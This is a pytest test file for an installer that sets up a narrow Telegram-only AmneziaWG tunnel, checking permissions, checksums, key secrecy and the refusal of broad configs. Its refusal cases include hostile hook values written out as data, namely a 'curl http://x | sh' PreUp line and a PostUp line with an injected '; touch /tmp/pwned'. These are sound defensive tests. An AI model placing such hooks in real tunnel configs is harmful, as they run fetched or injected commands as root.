"""scripts/pi5/install-awg.sh (ADR-0012) without root, systemd or ufw: every path is a temp dir
(SKIP_SYSTEM=1, OWNER empty). What matters: the installer refuses anything but a narrow Telegram
tunnel, keeps the keys private, is repeatable, and never prints key material."""

import hashlib
import os
import stat
import subprocess
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
SCRIPT = ROOT / "scripts/pi5/install-awg.sh"
PRIVATE = "PRIVATEKEYPRIVATEKEYPRIVATEKEYPRIVATEKEY0="
NETS = ("91.108.4.0/22, 91.108.8.0/22, 91.108.12.0/22, 91.108.16.0/22, 91.108.20.0/22, "
        "91.108.56.0/22, 91.105.192.0/23, 149.154.160.0/20, 185.76.151.0/24")
POST_UP = ("iptables -t mangle -A FORWARD -o %i -p tcp --tcp-flags SYN,RST SYN "
           "-j TCPMSS --clamp-mss-to-pmtu")
POST_DOWN = POST_UP.replace(" -A ", " -D ")
CONFIG = f"""[Interface]
Address = 10.8.1.2/32
PrivateKey = {PRIVATE}
MTU = 1280
Jc = 5
H1 = 1234567891
PostUp = {POST_UP}
PostDown = {POST_DOWN}

[Peer]
PublicKey = PUBLICKEYPUBLICKEYPUBLICKEYPUBLICKEYPUBLIC0=
Endpoint = 203.0.113.9:51820
AllowedIPs = {NETS}
PersistentKeepalive = 25
"""
AFTER_RULES = """# ufw's own block
*filter
:ufw-before-input - [0:0]
COMMIT

*filter
:DOCKER-USER - [0:0]
-A DOCKER-USER -m conntrack --ctstate RELATED,ESTABLISHED -j RETURN
-A DOCKER-USER -i wlan0 ! -s 192.168.0.0/24 -j DROP
-A DOCKER-USER -j RETURN
COMMIT
"""
RULE = "-A DOCKER-USER -i awg0 -m conntrack --ctstate NEW -j DROP"


@pytest.fixture
def box(tmp_path):
    stage = tmp_path / "stage"
    stage.mkdir()
    sums = []
    for name in ("amneziawg-go", "awg", "awg-quick"):
        (stage / name).write_bytes(b"binary " + name.encode())
        sums.append(f"{hashlib.sha256((stage / name).read_bytes()).hexdigest()}  {name}")
    (stage / "SHA256SUMS").write_text("\n".join(sums) + "\n")
    (stage / "awg-quick@.service").write_text((ROOT / "infra/pi5/etc/systemd/system/"
                                               "awg-quick@.service").read_text())
    (stage / "awg0.conf").write_text(CONFIG)
    ufw = tmp_path / "after.rules"
    ufw.write_text(AFTER_RULES)
    env = {**os.environ, "STAGE": str(stage), "BIN_DIR": str(tmp_path / "bin"),
           "UNIT_DIR": str(tmp_path / "unit"), "CONF_DIR": str(tmp_path / "conf"),
           "UFW_AFTER": str(ufw), "OWNER": "", "SKIP_SYSTEM": "1"}

    def run(*args, **override):
        return subprocess.run(["bash", str(SCRIPT), *args], capture_output=True, text=True,
                              env={**env, **override})
    run.stage, run.tmp, run.ufw = stage, tmp_path, ufw
    return run


def test_installs_binaries_unit_config_and_rule(box):
    done = box()
    assert done.returncode == 0, done.stderr + done.stdout
    tmp = box.tmp
    for name in ("amneziawg-go", "awg", "awg-quick"):
        assert stat.S_IMODE((tmp / "bin" / name).stat().st_mode) == 0o755
    assert (tmp / "unit" / "awg-quick@.service").exists()
    conf = tmp / "conf" / "awg0.conf"
    assert conf.read_text() == CONFIG
    assert stat.S_IMODE(conf.stat().st_mode) == 0o600
    assert stat.S_IMODE(conf.parent.stat().st_mode) == 0o700
    assert not (box.stage / "awg0.conf").exists(), "the staged copy holds the keys"
    rules = box.ufw.read_text().splitlines()
    anchor = "-A DOCKER-USER -m conntrack --ctstate RELATED,ESTABLISHED -j RETURN"
    assert rules.count(RULE) == 1 and rules.index(RULE) == rules.index(anchor) + 1
    assert list(tmp.glob("after.rules.bak-awg-*")), "a backup of after.rules is kept"


def test_no_key_material_in_the_output(box):
    done = box()
    for secret in (PRIVATE, "PUBLICKEYPUBLIC", "203.0.113.9"):
        assert secret not in done.stdout + done.stderr


def test_second_run_changes_nothing_more(box):
    box()
    box.stage.joinpath("awg0.conf").write_text(CONFIG)
    again = box()
    assert again.returncode == 0, again.stderr
    assert box.ufw.read_text().count(RULE) == 1
    assert "rule already" in again.stdout


def test_without_a_staged_config_the_installed_one_is_kept(box):
    box()
    again = box()
    assert again.returncode == 0
    assert "keeping the installed" in again.stdout
    assert (box.tmp / "conf" / "awg0.conf").read_text() == CONFIG


def test_a_changed_binary_is_refused_and_nothing_is_installed(box):
    (box.stage / "awg").write_bytes(b"tampered")
    done = box()
    assert done.returncode != 0
    assert not (box.tmp / "bin").exists()
    assert RULE not in box.ufw.read_text()


@pytest.mark.parametrize(("change", "reason"), [
    (lambda c: c.replace("MTU = 1280", "MTU = 1280\nDNS = 1.1.1.1"), "DNS"),
    (lambda c: c.replace(NETS, "0.0.0.0/0"), "not a Telegram range"),
    (lambda c: c.replace(NETS, NETS + ", ::/0"), "not a Telegram range"),
    (lambda c: c.replace(NETS, NETS + ", 10.0.0.0/8"), "not a Telegram range"),
    (lambda c: c.replace("149.154.160.0/20", "149.154.0.0/16"), "not a Telegram range"),
    (lambda c: c.replace("10.8.1.2/32", "10.8.1.2/32, fd00::2/128"), "IPv4 only"),
    (lambda c: c.replace("MTU = 1280", "MTU = 1280\nTable = off"), "Table"),
    (lambda c: c.replace(PRIVATE, "<PrivateKey of this device>"), "placeholder"),
    (lambda c: c.replace("Endpoint = 203.0.113.9:51820\n", ""), "Endpoint is missing"),
    (lambda c: c + "AllowedIPs = 8.8.8.8/32\n", "exactly once"),
    # Hooks run as root: only the TCPMSS pair of the template may stay.
    (lambda c: c.replace(POST_UP, "ip route add default dev %i"), "PostUp is not the TCPMSS"),
    (lambda c: c.replace(POST_UP, POST_UP + "; touch /tmp/pwned"), "PostUp is not the TCPMSS"),
    (lambda c: c.replace(POST_DOWN, "true"), "PostDown is not the TCPMSS"),
    (lambda c: c.replace("PostUp = ", "PreUp = curl http://x | sh\nPostUp = "), "PreUp is not"),
    (lambda c: c.replace("MTU = 1280", "MTU = 1280\nPreDown = true"), "PreDown is not"),
    (lambda c: c.replace("MTU = 1280", "MTU = 1280\nSaveConfig = true"), "SaveConfig is not"),
    (lambda c: c.replace("MTU = 1280", "MTU = 1280\nPostUp = true"), "PostUp is not"),
    (lambda c: c.replace(f"PostUp = {POST_UP}\n", "").replace(f"PostDown = {POST_DOWN}\n", ""),
     "is not the TCPMSS"),
])
def test_a_config_that_is_not_narrow_is_refused(box, change, reason):
    box.stage.joinpath("awg0.conf").write_text(change(CONFIG))
    done = box()
    assert done.returncode != 0
    assert reason in done.stderr, done.stderr
    assert not (box.tmp / "conf" / "awg0.conf").exists()
    assert (box.stage / "awg0.conf").exists()
    assert RULE not in box.ufw.read_text()
    for secret in (PRIVATE, "203.0.113.9"):
        assert secret not in done.stdout + done.stderr


def test_awg2_signature_parameters_with_angle_brackets_are_not_placeholders(box):
    config = CONFIG.replace("H1 = 1234567891", "H1 = 1234567891\nI1 = <b 0xc7000000><r 16><t>")
    box.stage.joinpath("awg0.conf").write_text(config)
    done = box()
    assert done.returncode == 0, done.stderr
    assert "I1 = <b 0xc7000000><r 16><t>" in (box.tmp / "conf" / "awg0.conf").read_text()


def test_without_any_config_it_stops(box):
    (box.stage / "awg0.conf").unlink()
    assert box().returncode != 0


def test_missing_docker_user_block_is_an_error(box):
    box.ufw.write_text("*filter\nCOMMIT\n")
    done = box()
    assert done.returncode != 0 and "DOCKER-USER" in done.stderr


def test_uninstall_removes_binaries_and_unit_but_not_the_config(box):
    box()
    done = box("uninstall")
    assert done.returncode == 0, done.stderr
    assert not any((box.tmp / "bin").glob("*"))
    assert not (box.tmp / "unit" / "awg-quick@.service").exists()
    assert (box.tmp / "conf" / "awg0.conf").exists()


# --- steps 5-7 (systemd, ufw, probes) with fake commands in PATH --------------------------------
# SKIP_SYSTEM=1 above skips them, which is how a probe that ended the script silently was missed.

FAKE = {
    "systemctl": r'''#!/bin/sh
echo "systemctl $*" >> "$FAKE_LOG"
case "$*" in
  "is-active --quiet "*) [ "$FAKE_ACTIVE" = 1 ]; exit $? ;;
  "is-active "*) echo active ;;
esac
exit 0''',
    "ufw": "#!/bin/sh\necho \"ufw $*\" >> \"$FAKE_LOG\"\n",
    "iptables": '#!/bin/sh\necho "-A DOCKER-USER -i awg0 -m conntrack --ctstate NEW -j DROP"\n',
    "ip": '#!/bin/sh\necho "route via fake: $*"\n',
    "curl": "#!/bin/sh\necho '  host: HTTP 000'\nexit 7\n",
    "getent": "#!/bin/sh\necho \"user:x:1000:1000::$FAKE_HOME:/bin/sh\"\n",
    "docker": "#!/bin/sh\necho '  scheduler container: HTTP 200'\n",
}


@pytest.fixture
def system(box):
    """The same box, but steps 5-7 run: fake commands first in PATH, a failing awg and curl."""
    tmp = box.tmp
    fakes = tmp / "fakes"
    fakes.mkdir()
    for name, body in FAKE.items():
        (fakes / name).write_text(body)
        (fakes / name).chmod(0o755)
    home = tmp / "home"
    (home / "shopflow").mkdir(parents=True)
    (home / "shopflow" / "docker-compose.pi5.yml").write_text("services: {}\n")
    # the staged awg is a script that fails: the daemon died after the start
    (box.stage / "awg").write_text("#!/bin/sh\nexit 1\n")
    sums = [f"{hashlib.sha256((box.stage / n).read_bytes()).hexdigest()}  {n}"
            for n in ("amneziawg-go", "awg", "awg-quick")]
    (box.stage / "SHA256SUMS").write_text("\n".join(sums) + "\n")
    log = tmp / "fake.log"
    log.write_text("")

    def run(active=0, **override):
        env = {"PATH": f"{fakes}:/usr/bin:/bin", "FAKE_LOG": str(log), "FAKE_ACTIVE": str(active),
               "FAKE_HOME": str(home), "SUDO_USER": "user", "SKIP_SYSTEM": "0",
               "NO_ROOT_CHECK": "1", "HANDSHAKE_TRIES": "1", "HANDSHAKE_WAIT": "0", **override}
        return box(**env)
    run.log, run.box = log, box
    return run


def test_failing_diagnostics_do_not_hide_the_rest_of_the_report(system):
    done = system()
    assert done.returncode == 0, done.stdout + done.stderr
    # awg show fails, curl exits 7: the lines after each of them are still printed
    for line in ("last handshake: none", "== 6. routes", "== 7. Telegram",
                 "host: HTTP 000", "scheduler container: HTTP 200"):
        assert line in done.stdout, (line, done.stdout)


def test_a_stopped_unit_is_started_and_a_running_one_is_restarted_to_apply_new_files(system):
    system(active=0)
    calls = system.log.read_text()
    assert "systemctl start awg-quick@awg0" in calls and "restart" not in calls
    system.log.write_text("")
    again = system(active=1)
    assert "restarting it to apply the new files" in again.stdout
    assert "systemctl restart awg-quick@awg0" in system.log.read_text()


def test_the_unit_is_enabled_and_ufw_reloaded(system):
    system()
    calls = system.log.read_text()
    assert "systemctl enable awg-quick@awg0" in calls
    assert "ufw reload" in calls


def test_a_file_swapped_after_the_check_is_not_what_gets_installed(system):
    """The installer works on a private copy: a staged file changed between the check and the
    install (the staged folder belongs to a normal user) must not reach /usr/local/bin."""
    fakes = system.box.tmp / "fakes"
    # runs at the config check: swaps a staged binary, then does the real work
    (fakes / "python3").write_text(
        f'#!/bin/sh\necho swapped > "$STAGE/awg-quick"\nexec {sys.executable} "$@"\n')
    (fakes / "python3").chmod(0o755)
    done = system()
    assert done.returncode == 0, done.stdout + done.stderr
    assert (system.box.stage / "awg-quick").read_text() == "swapped\n"   # the swap did happen
    assert (system.box.tmp / "bin" / "awg-quick").read_bytes() == b"binary awg-quick"
